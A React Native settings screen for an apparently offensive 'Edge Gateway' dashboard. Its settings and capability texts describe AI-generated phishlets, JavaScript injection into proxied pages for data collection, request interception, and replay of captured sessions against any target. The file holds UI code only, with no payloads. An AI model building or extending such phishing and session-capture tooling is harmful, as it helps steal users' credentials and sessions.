import AsyncStorage from "@react-native-async-storage/async-storage";
import { LinearGradient } from "expo-linear-gradient";
import {
  ArrowRight,
  CheckCircle2,
  Cpu,
  Eye,
  EyeOff,
  Key,
  Layers,
  Network,
  Puzzle,
  RefreshCw,
  Save,
  Settings as SettingsIcon,
  Shield,
  Sliders,
  Trash2,
  Wrench,
  XCircle,
  Zap,
} from "lucide-react-native";
import React, { useCallback, useEffect, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  Linking,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";

import AppField from "@/components/AppField";
import ConfigField from "@/components/ConfigField";
import CopyRow from "@/components/CopyRow";
import FadeIn from "@/components/FadeIn";
import PressableScale from "@/components/PressableScale";
import TunnelRow from "@/components/TunnelRow";
import EmptyState from "@/components/EmptyState";
import { layout, card, type as typeStyles, form, states } from "@/constants/styles";
import { theme } from "@/constants/theme";
import {
  useDeleteRuntimeConfig,
  useProxyStatus,
  useRuntimeConfig,
  useTestHealth,
  useTunnels,
  useUpdateRuntimeConfig,
} from "@/hooks/useGateway";
import { setBaseUrl } from "@/lib/api";

// ── Constants ──

const SETTINGS_KEY = "edge-gateway-settings-v2";
type AppSettings = { gatewayUrl: string; proxyHost: string; allowedOrigins: string; apiKey: string };
function defaultSettings(): AppSettings { return { gatewayUrl: "", proxyHost: "", allowedOrigins: "", apiKey: "" }; }

const CONFIG_GROUPS: Array<{ title: string; icon: React.ElementType; keys: string[] }> = [
  { title: "Security", icon: Shield, keys: ["API_KEY"] },
  { title: "Edge Proxy", icon: Network, keys: ["PROXY_TARGET", "BASE_DOMAIN", "ALLOWED_ORIGINS"] },
  { title: "Intercept Lab", icon: Sliders, keys: ["INTERCEPT_LAB_MODE", "INTERCEPT_ALLOWLIST", "INTERCEPT_BLOCKLIST", "INTERCEPT_TTL_SECONDS"] },
  { title: "AI Phishlet Engine", icon: Cpu, keys: ["TOOLKIT_URL", "TOOLKIT_SECRET"] },
];

const FIELD_LABELS: Record<string, string> = {
  ALLOWED_ORIGINS: "Allowed Origins", INTERCEPT_LAB_MODE: "Intercept Lab Mode",
  INTERCEPT_ALLOWLIST: "Intercept Allowlist", INTERCEPT_BLOCKLIST: "Intercept Blocklist",
  INTERCEPT_TTL_SECONDS: "Intercept TTL", API_KEY: "API Key",
  TOOLKIT_URL: "Toolkit URL", TOOLKIT_SECRET: "Toolkit Secret",
  PROXY_TARGET: "Default Proxy Target", BASE_DOMAIN: "Base Domain",
};

const FIELD_HINTS: Record<string, string> = {
  ALLOWED_ORIGINS: "Comma-separated origins allowed for CORS. Use * to allow all.",
  INTERCEPT_LAB_MODE: "Enable payload capture on proxied requests.",
  INTERCEPT_TTL_SECONDS: "How long to retain captures (seconds). Default: 600.",
  API_KEY: "Bearer token for write operations and config changes.",
  TOOLKIT_SECRET: "Rork Toolkit secret for AI-powered phishlet generation.",
};

const FIELD_DEFAULT: Record<string, string> = {
  ALLOWED_ORIGINS: "", INTERCEPT_LAB_MODE: "false", INTERCEPT_ALLOWLIST: "",
  INTERCEPT_BLOCKLIST: "", INTERCEPT_TTL_SECONDS: "600", API_KEY: "",
  TOOLKIT_URL: "", TOOLKIT_SECRET: "", PROXY_TARGET: "", BASE_DOMAIN: "",
};

function authHeader(apiKey: string): string | undefined {
  return apiKey.trim() ? `Bearer ${apiKey.trim()}` : undefined;
}

// ── Architecture info ──

const ARCHITECTURE = [
  { icon: Layers, title: "Expo App", body: "Dashboard for managing proxies, viewing intercepted traffic, running reconnaissance, and configuring the gateway." },
  { icon: Shield, title: "Edge Gateway", body: "Self-hosted Node.js server — wildcard DNS routing, WebSocket passthrough, HTML rewriting, and security headers on every request." },
  { icon: Cpu, title: "In-Memory Store", body: "Persistent storage for proxies, items, config overrides, intercept captures, and phishlets." },
];

const CAPABILITIES = [
  { icon: Network, title: "Tunnel management", body: "Create, start, stop, and delete proxy tunnels with live stats and health monitoring." },
  { icon: Puzzle, title: "Per-proxy JS injection", body: "Inject custom JavaScript into proxied HTML pages for data collection." },
  { icon: Cpu, title: "Automated phishlet generation", body: "One-tap recon pipeline: capture → generate → iterate → refine." },
  { icon: Key, title: "API key auth", body: "Bearer token authentication on all write endpoints and config changes." },
  { icon: Sliders, title: "Runtime config", body: "Live config overrides — no redeploy needed." },
  { icon: ArrowRight, title: "HAR replay engine", body: "Export captures as HAR and replay full sessions against any target." },
];

export default function SettingsScreen() {
  const insets = useSafeAreaInsets();

  const [settings, setSettings] = useState<AppSettings>(defaultSettings());
  const [loaded, setLoaded] = useState(false);
  const [dirty, setDirty] = useState(false);
  const [showKey, setShowKey] = useState(false);

  useEffect(() => {
    (async () => {
      try {
        const raw = await AsyncStorage.getItem(SETTINGS_KEY);
        const stored = raw !== null ? (JSON.parse(raw) as Partial<AppSettings>) : {};
        const apiKey = (await AsyncStorage.getItem("edge-api-key")) || "";
        const gw = stored.gatewayUrl || "";
        setBaseUrl(gw);
        setSettings({ gatewayUrl: gw, proxyHost: stored.proxyHost || "", allowedOrigins: stored.allowedOrigins || "", apiKey });
      } catch { setSettings(defaultSettings()); }
      setLoaded(true);
    })();
  }, []);

  const persist = useCallback(async (next: AppSettings) => {
    await AsyncStorage.setItem(SETTINGS_KEY, JSON.stringify({ gatewayUrl: next.gatewayUrl, proxyHost: next.proxyHost, allowedOrigins: next.allowedOrigins }));
    await AsyncStorage.setItem("edge-api-key", next.apiKey);
  }, []);

  const updateApp = useCallback(<K extends keyof AppSettings>(key: K, value: AppSettings[K]) => {
    setSettings((prev) => ({ ...prev, [key]: value }));
    setDirty(true);
  }, []);

  const saveApp = useCallback(() => { setBaseUrl(settings.gatewayUrl); persist(settings); setDirty(false); }, [settings, persist]);

  const ah = authHeader(settings.apiKey);
  const config = useRuntimeConfig(ah);
  const updateConfig = useUpdateRuntimeConfig(ah);
  const clearConfig = useDeleteRuntimeConfig(ah);
  const testHealth = useTestHealth();
  const [edit, setEdit] = useState<Record<string, string>>({ ...FIELD_DEFAULT });
  const [editDirty, setEditDirty] = useState(false);

  useEffect(() => { if (!editDirty) setEdit({ ...FIELD_DEFAULT, ...(config.data ?? {}) }); }, [config.data, editDirty]);

  const { data: tunnelsResult, isLoading: tunnelsLoading, refetch: refetchTunnels } = useTunnels();
  const { data: proxyStatus } = useProxyStatus();
  const tunnels = tunnelsResult?.data ?? [];

  const updateField = useCallback((key: string, value: string) => { setEdit((prev) => ({ ...prev, [key]: value })); setEditDirty(true); }, []);
  const saveConfig = useCallback(() => { updateConfig.mutate(edit, { onSuccess: () => setEditDirty(false) }); }, [edit, updateConfig]);
  const revertConfig = useCallback(() => {
    Alert.alert("Revert to defaults", "Clear all runtime config overrides?", [
      { text: "Cancel", style: "cancel" },
      { text: "Revert", style: "destructive", onPress: () => clearConfig.mutate(undefined, { onSuccess: () => { setEdit({ ...FIELD_DEFAULT }); setEditDirty(false); } }) },
    ]);
  }, [clearConfig]);

  if (!loaded) return <View style={layout.root}><ActivityIndicator color={theme.colors.accent} style={{ flex: 1 }} /></View>;

  return (
    <View style={layout.root}>
      <LinearGradient colors={[theme.colors.accentGlow, "transparent"]} start={{ x: 0.5, y: 0 }} end={{ x: 0.5, y: 0.4 }} style={[layout.glow, { height: 260 }]} pointerEvents="none" />
      <ScrollView contentContainerStyle={[layout.content, { paddingTop: insets.top + theme.spacing(6), gap: theme.spacing(3) }]} showsVerticalScrollIndicator={false}>
        <Text style={typeStyles.eyebrow}>SETTINGS</Text>
        <Text style={[typeStyles.hero, { fontSize: 30 }]}>Configuration</Text>
        <Text style={[typeStyles.sub, { marginBottom: theme.spacing(1) }]}>Manage API keys, app settings, runtime configuration, proxy tunnels, and architecture reference — all from one place.</Text>

        {settings.gatewayUrl.trim() === "" && (
          <View style={styles.setupBanner}>
            <Text style={styles.setupTitle}>Gateway URL required</Text>
            <Text style={styles.setupText}>Enter your server URL below to connect this app to your gateway.</Text>
          </View>
        )}

        {/* API Key */}
        <View style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <Key size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>API Key</Text>
          </View>
          <Text style={typeStyles.stateHint}>Used to authenticate write operations, intercept access, and config changes.</Text>
          <View style={styles.keyRow}>
            <TextInput style={styles.keyInput} value={settings.apiKey} onChangeText={(v) => updateApp("apiKey", v)} placeholder="API key" placeholderTextColor={theme.colors.textFaint} secureTextEntry={!showKey} autoCapitalize="none" autoCorrect={false} textContentType="password" />
            <Pressable onPress={() => setShowKey((p) => !p)} style={styles.eyeBtn} hitSlop={8}>
              {showKey ? <EyeOff size={18} color={theme.colors.textDim} /> : <Eye size={18} color={theme.colors.textDim} />}
            </Pressable>
          </View>
        </View>

        {/* App Settings */}
        <View style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <SettingsIcon size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>App Settings</Text>
          </View>
          <Text style={typeStyles.stateHint}>Persisted on this device.</Text>
          <AppField label="Gateway URL" value={settings.gatewayUrl} onChange={(v) => updateApp("gatewayUrl", v)} placeholder="https://your-server.rork.app" />
          <AppField label="Proxy Host" value={settings.proxyHost} onChange={(v) => updateApp("proxyHost", v)} placeholder="https://example.com" />
          <AppField label="Allowed Origins" value={settings.allowedOrigins} onChange={(v) => updateApp("allowedOrigins", v)} placeholder="*" />
          {dirty && (
            <PressableScale onPress={saveApp} haptic="medium" style={[form.submitBtn, { marginTop: theme.spacing(1) }]}>
              <Save size={15} color={theme.colors.bg} />
              <Text style={form.submitText}>Save app settings</Text>
            </PressableScale>
          )}
        </View>

        {/* Runtime Config */}
        <View style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <Sliders size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Runtime Config</Text>
          </View>
          <Text style={typeStyles.stateHint}>Overrides stored in the gateway. Take precedence over env vars.</Text>

          {config.isLoading ? (
            <View style={states.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={states.loadText}>Loading config...</Text></View>
          ) : config.isError ? (
            <View style={styles.configErr}><Shield size={18} color={theme.colors.danger} /><Text style={styles.configErrText}>{config.error?.message ?? "Failed to load config."}</Text></View>
          ) : (
            <>
              {CONFIG_GROUPS.map((group) => (
                <View key={group.title} style={styles.configGroup}>
                  <View style={styles.configGroupHead}>
                    <group.icon size={13} color={theme.colors.accent} />
                    <Text style={styles.configGroupTitle}>{group.title}</Text>
                  </View>
                  {group.keys.map((key) => (
                    <ConfigField
                      key={key}
                      fieldKey={key}
                      value={edit[key] ?? FIELD_DEFAULT[key] ?? ""}
                      defaultValue={FIELD_DEFAULT[key] ?? ""}
                      label={FIELD_LABELS[key] ?? key}
                      hint={FIELD_HINTS[key]}
                      onChange={updateField}
                    />
                  ))}
                </View>
              ))}
              {config.data && Object.keys(config.data).length > 0 && (
                <View style={styles.metaRow}>
                  <Text style={styles.metaText}>{Object.keys(config.data).length} override{Object.keys(config.data).length !== 1 ? "s" : ""} active</Text>
                  <Pressable onPress={revertConfig} disabled={clearConfig.isPending} style={({ pressed }) => [styles.dangerBtn, pressed && { opacity: 0.7 }]}>
                    {clearConfig.isPending ? <ActivityIndicator size="small" color={theme.colors.danger} /> : <Trash2 size={13} color={theme.colors.danger} />}
                    <Text style={styles.dangerText}>Revert to defaults</Text>
                  </Pressable>
                </View>
              )}
              {editDirty && (
                <PressableScale onPress={saveConfig} disabled={updateConfig.isPending} haptic="medium" style={[form.submitBtn, { marginTop: theme.spacing(1) }]}>
                  {updateConfig.isPending ? <ActivityIndicator size="small" color={theme.colors.bg} /> : <Save size={15} color={theme.colors.bg} />}
                  <Text style={form.submitText}>{updateConfig.isPending ? "Saving..." : "Save runtime config"}</Text>
                </PressableScale>
              )}

              {/* Test Connection */}
              <View style={styles.testSection}>
                <PressableScale
                  onPress={() => testHealth.mutate()}
                  disabled={testHealth.isPending}
                  haptic="light"
                  style={[form.submitBtn, { backgroundColor: theme.colors.surface, borderWidth: 1, borderColor: theme.colors.border }]}
                >
                  {testHealth.isPending ? (
                    <ActivityIndicator size="small" color={theme.colors.accent} />
                  ) : (
                    <Zap size={15} color={theme.colors.accent} />
                  )}
                  <Text style={[form.submitText, { color: theme.colors.accent }]}>
                    {testHealth.isPending ? "Testing..." : "Test Connection"}
                  </Text>
                </PressableScale>

                {testHealth.isSuccess && testHealth.data && (
                  <View style={styles.testResult}>
                    <CheckCircle2 size={14} color={theme.colors.ok} />
                    <Text style={styles.testOkText}>
                      Gateway healthy — {testHealth.data.meta.latencyMs ?? "?"}ms latency
                      {testHealth.data.uptime ? `, uptime ${Math.floor(testHealth.data.uptime / 60)}m` : ""}
                    </Text>
                  </View>
                )}

                {testHealth.isError && (
                  <View style={[styles.testResult, styles.testResultErr]}>
                    <XCircle size={14} color={theme.colors.danger} />
                    <Text style={styles.testErrText} numberOfLines={3}>
                      {testHealth.error?.message ?? "Connection failed"}
                    </Text>
                  </View>
                )}
              </View>
            </>
          )}
        </View>

        {/* Proxy Tunnels */}
        <View style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <Network size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Proxy Tunnels</Text>
          </View>
          <Text style={typeStyles.stateHint}>Self-hosted Pangolin/frp-style tunnels replacing Cloudflare Workers.</Text>

          {proxyStatus ? (
            <View style={styles.statusGrid}>
              <View style={styles.statusCard}><Text style={styles.statusValue}>{proxyStatus.tunnelsRunning}</Text><Text style={styles.statusLabel}>running</Text></View>
              <View style={styles.statusCard}><Text style={styles.statusValue}>{proxyStatus.tunnelsStopped}</Text><Text style={styles.statusLabel}>stopped</Text></View>
              <View style={styles.statusCard}><Text style={styles.statusValue}>{proxyStatus.totalActiveConns}</Text><Text style={styles.statusLabel}>connections</Text></View>
              <View style={styles.statusCard}><Text style={styles.statusValue}>{(proxyStatus.totalBytesTransferred / 1024).toFixed(1)} KB</Text><Text style={styles.statusLabel}>transferred</Text></View>
            </View>
          ) : null}

          {tunnelsLoading ? (
            <View style={states.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={states.loadText}>Loading tunnels...</Text></View>
          ) : tunnels.length === 0 ? (
            <EmptyState
              icon={<Network size={22} color={theme.colors.accent} />}
              title="No active tunnels"
              subtitle="Create one from the Proxies tab."
            />
          ) : (
            <View style={styles.tunnelList}>
              {tunnels.map((t) => (<TunnelRow key={t.id} tunnel={t} authHeader={ah} />))}
            </View>
          )}

          <Pressable onPress={() => refetchTunnels()} style={({ pressed }) => [styles.refreshRow, pressed && states.pressed]}>
            <RefreshCw size={12} color={theme.colors.accent} />
            <Text style={styles.refreshText}>Refresh tunnels</Text>
          </Pressable>
        </View>

        {/* Gateway URLs */}
        <View style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <Wrench size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Gateway URLs &amp; APIs</Text>
          </View>
          <View style={card.elevated}>
            <CopyRow label="Gateway URL" value={settings.gatewayUrl || "Not configured"} />
            <CopyRow label="Health" value={`${settings.gatewayUrl}/health`} />
            <CopyRow label="Config API" value={`${settings.gatewayUrl}/api/config`} />
            <CopyRow label="Proxies API" value={`${settings.gatewayUrl}/api/proxies`} />
            <CopyRow label="Tunnels API" value={`${settings.gatewayUrl}/api/proxy/tunnels`} />
            <CopyRow label="Intercepts API" value={`${settings.gatewayUrl}/api/intercepts`} />
            <CopyRow label="HAR Export" value={`${settings.gatewayUrl}/api/intercepts/har`} />
          </View>
        </View>

        {/* Architecture */}
        <FadeIn delay={60} style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <Layers size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Architecture</Text>
          </View>
          <View style={styles.archStack}>
            {ARCHITECTURE.map((layer, i) => {
              const Icon = layer.icon;
              return (
                <View key={layer.title}>
                  <View style={styles.archCard}>
                    <View style={styles.archIconWrap}><Icon size={18} color={theme.colors.accent} /></View>
                    <View style={styles.archBody}>
                      <Text style={styles.archTitle}>{layer.title}</Text>
                      <Text style={styles.archText}>{layer.body}</Text>
                    </View>
                  </View>
                  {i < ARCHITECTURE.length - 1 && <View style={styles.archConnector} />}
                </View>
              );
            })}
          </View>
        </FadeIn>

        {/* Capabilities */}
        <FadeIn delay={120} style={styles.section}>
          <View style={typeStyles.sectionHeaderRow}>
            <Puzzle size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Capabilities</Text>
          </View>
          <View style={styles.capGrid}>
            {CAPABILITIES.map((cap, i) => {
              const Icon = cap.icon;
              return (
                <FadeIn key={cap.title} delay={140 + i * 50} offset={8} style={styles.capCard}>
                  <Icon size={15} color={theme.colors.accent} />
                  <Text style={styles.capTitle}>{cap.title}</Text>
                  <Text style={styles.capText}>{cap.body}</Text>
                </FadeIn>
              );
            })}
          </View>
        </FadeIn>

        {/* Docs link */}
        <PressableScale onPress={() => Linking.openURL("https://github.com/fatedier/frp")} haptic="light" style={[form.submitBtn, { borderRadius: theme.radius.md }]}>
          <Text style={form.submitText}>frp — fast reverse proxy docs</Text>
          <ArrowRight size={15} color={theme.colors.bg} />
        </PressableScale>

        <Text style={styles.footer}>Edge Gateway Dashboard · built with Rork</Text>
      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  section: { marginTop: theme.spacing(1), gap: theme.spacing(2) },
  sectionTitle: { color: theme.colors.text, fontSize: 15, fontWeight: "700" },
  setupBanner: { backgroundColor: "rgba(255,178,62,0.10)", borderRadius: theme.radius.md, borderWidth: 1, borderColor: "rgba(255,178,62,0.35)", padding: theme.spacing(4), gap: theme.spacing(1) },
  setupTitle: { color: theme.colors.warn, fontSize: 14, fontWeight: "800" },
  setupText: { color: theme.colors.textDim, fontSize: 13, lineHeight: 19 },
  keyRow: { flexDirection: "row", alignItems: "center", backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border },
  keyInput: { flex: 1, color: theme.colors.text, fontSize: 14, paddingVertical: theme.spacing(3), paddingLeft: theme.spacing(4), fontFamily: theme.font.mono, letterSpacing: 1 },
  eyeBtn: { padding: theme.spacing(3) },
  configErr: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), padding: theme.spacing(3) },
  configErrText: { color: theme.colors.danger, fontSize: 13, flexShrink: 1 },
  configGroup: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden", marginBottom: theme.spacing(2) },
  configGroupHead: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5), backgroundColor: theme.colors.bgElevated, borderBottomWidth: 1, borderBottomColor: theme.colors.border },
  configGroupTitle: { color: theme.colors.text, fontSize: 12, fontWeight: "700", letterSpacing: 0.5 },
  metaRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between" },
  metaText: { color: theme.colors.textFaint, fontSize: 11, fontFamily: theme.font.mono },
  dangerBtn: { flexDirection: "row", alignItems: "center", gap: 6, paddingVertical: theme.spacing(2), paddingHorizontal: theme.spacing(3), borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border },
  dangerText: { color: theme.colors.danger, fontSize: 12, fontWeight: "600" },
  statusGrid: { flexDirection: "row", gap: theme.spacing(2) },
  statusCard: { flex: 1, backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), alignItems: "center", gap: theme.spacing(1) },
  statusValue: { color: theme.colors.accent, fontSize: 20, fontWeight: "800", fontFamily: theme.font.mono },
  statusLabel: { color: theme.colors.textFaint, fontSize: 9, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono },
  tunnelList: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden" },
  refreshRow: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), paddingVertical: theme.spacing(2) },
  refreshText: { color: theme.colors.accent, fontSize: 12, fontWeight: "600" },
  archStack: { marginTop: theme.spacing(1) },
  archCard: { flexDirection: "row", alignItems: "center", gap: theme.spacing(3), backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3.5) },
  archIconWrap: { width: 40, height: 40, borderRadius: theme.radius.sm, backgroundColor: theme.colors.accentGlow, alignItems: "center", justifyContent: "center" },
  archBody: { flex: 1, gap: 2 },
  archTitle: { color: theme.colors.text, fontSize: 14, fontWeight: "700" },
  archText: { color: theme.colors.textDim, fontSize: 12, lineHeight: 17 },
  archConnector: { width: 2, height: 16, backgroundColor: theme.colors.borderStrong, marginLeft: theme.spacing(4) + 19 },
  capGrid: { flexDirection: "row", flexWrap: "wrap", gap: theme.spacing(2) },
  capCard: { width: "47%", backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3.5), gap: theme.spacing(2) },
  capTitle: { color: theme.colors.text, fontSize: 13, fontWeight: "700" },
  capText: { color: theme.colors.textDim, fontSize: 11, lineHeight: 16 },
  footer: { color: theme.colors.textFaint, fontSize: 11, textAlign: "center", marginTop: theme.spacing(4), fontFamily: theme.font.mono },
  testSection: { gap: theme.spacing(1.5), marginTop: theme.spacing(1.5) },
  testResult: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), padding: theme.spacing(2.5), backgroundColor: "rgba(60,224,138,0.08)", borderRadius: theme.radius.sm, borderWidth: 1, borderColor: "rgba(60,224,138,0.25)" },
  testOkText: { color: theme.colors.ok, fontSize: 12, fontWeight: "600", flexShrink: 1 },
  testResultErr: { backgroundColor: "rgba(255,92,114,0.08)", borderColor: "rgba(255,92,114,0.25)" },
  testErrText: { color: theme.colors.danger, fontSize: 12, fontWeight: "600", flexShrink: 1 },
});
